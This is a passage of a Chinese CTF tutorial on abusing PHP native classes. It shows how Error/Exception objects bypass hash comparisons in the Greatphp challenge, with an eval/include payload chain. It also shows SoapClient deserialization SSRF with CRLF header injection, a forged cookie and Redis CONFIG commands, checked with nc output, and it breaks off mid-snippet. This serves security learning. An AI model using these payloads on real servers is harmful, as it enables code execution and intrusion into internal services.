<p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> {
    <span class="hljs-comment">/* 属性 */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">""</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span>
}</code></pre>
<p><strong>类属性：</strong></p>
<pre><code class="hljs plaintext">- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数</code></pre>
<p><strong>类方法：</strong></p>
<pre><code class="hljs plaintext">- `Error::__construct` — 初始化 error 对象
- `Error::getMessage` — 获取错误信息
- `Error::getPrevious` — 返回先前的 Throwable
- `Error::getCode` — 获取错误代码
- `Error::getFile` — 获取错误发生时的文件
- `Error::getLine` — 获取错误发生时的行号
- `Error::getTrace` — 获取调用栈（stack trace）
- `Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace）
- `Error::__toString` — error 的字符串表达
- `Error::__clone` — 克隆 error</code></pre>
<h4 id="exception-类">Exception 类</h4>
<p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">Exception</span> {
    <span class="hljs-comment">/* 属性 */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">""</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span>
}</code></pre>
<p><strong>类属性：</strong></p>
<pre><code class="hljs plaintext">- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号</code></pre>
<p><strong>类方法：</strong></p>
<pre><code class="hljs plaintext">- `Exception::__construct` — 异常构造函数
- `Exception::getMessage` — 获取异常消息内容
- `Exception::getPrevious` — 返回异常链中的前一个异常
- `Exception::getCode` — 获取异常代码
- `Exception::getFile` — 创建异常时的程序文件名称
- `Exception::getLine` — 获取创建的异常所在文件中的行号
- `Exception::getTrace` — 获取异常追踪信息
- `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息
- `Exception::__toString` — 将异常对象转换为字符串
- `Exception::__clone` — 异常克隆</code></pre>
<p>我们可以看到，在Error和Exception这两个PHP原生类中内都有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>我们以Error为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"payload"</span>,<span class="hljs-number">1</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;</code></pre>
<p>输出：</p>
<pre><code class="hljs php"><span class="hljs-built_in">Error</span>: payload in /<span class="hljs-keyword">var</span>/www/html/tmp/test.php:<span class="hljs-number">2</span>
Stack trace:
<span class="hljs-comment">#0 {main}</span></code></pre>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error("payload",1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>在来看看下一个例子：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"payload"</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"payload"</span>,<span class="hljs-number">2</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\r\n\r\n"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;</code></pre>
<p>输出：</p>
<pre><code class="hljs php"><span class="hljs-built_in">Error</span>: payload in /<span class="hljs-keyword">var</span>/www/html/tmp/test.php:<span class="hljs-number">2</span>
Stack trace:
<span class="hljs-comment">#0 {main}</span>
 
<span class="hljs-built_in">Error</span>: payload in /<span class="hljs-keyword">var</span>/www/html/tmp/test.php:<span class="hljs-number">2</span>
Stack trace:
<span class="hljs-comment">#0 {main}</span></code></pre>
<p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
<p>Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用。</p>
<p>[<a target="_blank" rel="noopener" href="http://81.71.121.131/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/">2020 极客大挑战]Greatphp</a></p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) ){
           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\&lt;\?php|\(|\)|\"|\'/"</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>)){
               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);
           } <span class="hljs-keyword">else</span> {
               <span class="hljs-keyword">die</span>(<span class="hljs-string">"Try Hard !!"</span>);
           }
           
        }
    }
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'great'</span>])){
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'great'</span>]);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p>​		我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 __toString 方法输出的结果相同即可<br>
​		由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可</p>
<p>poc：这里说一下url取反</p>
<p><strong>URL编码取反绕过</strong></p>
<pre><code>适用PHP版本：无限制
当PHP&gt;=7时，可以直接利用取反构造payload

PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'phpinfo'));"
Command line code:1:
string(21) "%8F%97%8F%96%91%99%90"

//实际上
(~%8F%97%8F%96%91%99%90)();
#phpinfo();
</code></pre>
<pre><code class="hljs php"><span class="hljs-comment">//利用链如下</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$str</span> = <span class="hljs-string">"?&gt;&lt;?=include~"</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">"%D0%99%93%9E%98"</span>).<span class="hljs-string">"?&gt;"</span>;   <span class="hljs-comment">//~urldecode=/flag</span>
<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);
<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();
<span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;
<span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;
<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//这里解释以下，为什么要闭合掉"?&gt;"，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。</span></code></pre>
<h3 id="103-soapclient-类进行-ssrf">10.3 SoapClient 类进行 SSRF</h3>
<h4 id="soapclient-类">SoapClient 类</h4>
<p>SOAP（简单对象访问协议）是连接Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p>
<p><strong>如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项</strong></p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php">SoapClient {
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$wsdl</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [] )
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span> , <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span> ( ) : <span class="hljs-keyword">array</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span> ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span> ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-string">""</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span> , SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span> , <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">mixed</span>
}</code></pre>
<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> SoapClient :: <span class="hljs-title function_ invoke__">SoapClient</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$wsdl</span> [，<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> ])</code></pre>
<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
</ul>
<p><strong>使用 SoapClient 类进行 SSRF</strong></p>
<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span>=&gt;<span class="hljs-string">'http://192.168.91.153:2333/aaa'</span>, <span class="hljs-string">'uri'</span>=&gt;<span class="hljs-string">'http://192.168.91.153:2333'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>example：</p>
<p>首先在192.168.91.153:2333上起一个监听，然后再执行上述代码，就能够成功发送HTTP请求：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7856</span> received!
POST /aaa HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: PHP-SOAP/<span class="hljs-number">7.4</span>.<span class="hljs-number">3</span>
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"http://192.168.91.153:2333#a"</span>
Content-Length: <span class="hljs-number">387</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"http://192.168.91.153:2333"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p>这里不知为何我开启不了这个类,先看个思路</p>
<p>但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
<p>如下测试代码，我们在HTTP头中插入一个cookie：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">'http://192.168.91.153:2333/'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">'user_agent'</span> =&gt; <span class="hljs-string">"WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4"</span>, <span class="hljs-string">'uri'</span> =&gt; <span class="hljs-string">'test'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7858</span> received!
POST / HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: WHOAMI
Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4        <span class="hljs-comment"># 插入的cookie</span>
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"test#a"</span>
Content-Length: <span class="hljs-number">365</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"test"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p>利用HTTP协议去攻击Redis：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">'http://192.168.91.153:2333/'</span>;
<span class="hljs-variable">$poc</span> = <span class="hljs-string">"CONFIG SET dir /var/www/html"</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">'uri'</span> =&gt; <span class="hljs-string">'hello^^'</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">'^^hello'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'^^'</span>,<span class="hljs-string">"\n\r"</span>,<span class="hljs-variable">$b</span>); 
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>执行代码后，如下图所示，成功插入了Redis命令：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7860</span> received!
POST / HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: PHP-SOAP/<span class="hljs-number">7.4</span>.<span class="hljs-number">3</span>
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"hello</span>
<span class="hljs-string">CONFIG SET dir /var/www/html        # 这里就是Redis命令</span>
<span class="hljs-string">hello#a"</span>
Content-Length: <span class="hljs-number">403</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"hello</span>
<span class="hljs-string">CONFIG SET dir /var/www/html</span>
<span class="hljs-string">hello"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p>这样我们就可以利用HTTP协议去攻击Redis了。</p>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据，所以 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">'http://192.168.91.153:2333/'</span>;
<span class="hljs-variable">$post_data</span> = <span class="hljs-string">'data=whoami'</span>;
<span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(
    <span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span>,
    <span class="hljs-string">'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'</span>
);
